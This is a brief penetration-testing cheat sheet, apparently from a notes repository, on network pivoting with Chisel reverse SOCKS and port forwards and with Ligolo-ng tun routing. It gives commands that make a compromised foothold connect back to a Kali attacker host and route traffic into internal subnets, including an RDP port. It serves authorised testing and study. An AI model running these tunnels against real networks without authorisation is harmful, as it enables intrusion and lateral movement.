# Chisel and Ligolo-ng

[← Pivoting quick reference](../06-pivoting.md)

Chisel = reverse SOCKS/port; Ligolo-ng = subnet route. Record listener, route, subnet.

## Chisel reverse SOCKS

```bash
# Kali
./chisel server -p 8080 --reverse

# Foothold
./chisel client <kali-ip>:8080 R:1080:socks
```

`R:1080:socks` = reverse SOCKS on Kali 1080. Proxychains → `127.0.0.1:1080`; Nmap uses TCP connect. [Syntax](https://github.com/jpillora/chisel#usage).

One internal service exposed on Kali:

```bash
./chisel client <kali-ip>:8080 R:3389:<internal-ip>:3389
```

Confirm service from foothold and which side listens on 3389.

## Ligolo-ng

```bash
# Kali
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Foothold
./agent -connect <kali-ip>:11601 -ignore-cert
```

Select agent, start session, add route:

```bash
sudo ip route add <internal-subnet>/24 dev ligolo
```

Reverse listener through agent: `listener_add`; verify direction with one connection.

Failure: duplicate route, inactive agent, or no foothold reachability. Remove route/listener when done.
